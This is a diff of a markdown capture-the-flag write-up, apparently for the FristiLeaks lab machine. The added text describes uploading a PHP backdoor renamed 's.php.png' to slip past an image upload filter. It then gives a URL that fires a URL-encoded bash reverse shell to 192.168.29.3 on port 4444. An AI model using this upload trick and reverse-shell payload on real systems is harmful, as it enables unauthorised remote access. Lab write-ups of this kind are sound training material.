@@ -42,6 +42,7 @@ So all we have is a web serve on port 80. Checking out the urls in robot.txt jus
 <image>
     
 We are greeted with a login page. Tried out some `sql` injection, but it seems to invulnerable. Let's check if there is anything interesting in the source code.  
+aaa.  
 
    
 ```bash
@@ -99,4 +100,18 @@ We are presented with a string, which might be probably be the password for `eez
 
 <image>
     
-We are greeted with a upload file page, that only allows 
+We are greeted with a upload file page, that only allows `png,jpg,gif`. After trying out various payloads, I found the following.
+
+1. The file has to end with `.png` to be uploaded
+2. The [magic byte]() of the file is irrelevant.
+
+I used simple php backdoor available at `/usr/share/webshells/php/simple-backdoor.php`, renamed it as `s.php.png` and uploaded it.
+
+
+## Low Shell
+
+```bash
+fristileaks.com/fristi/uploads/s.php.png?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.29.3%2F4444%200%3E%261
+```
+
+
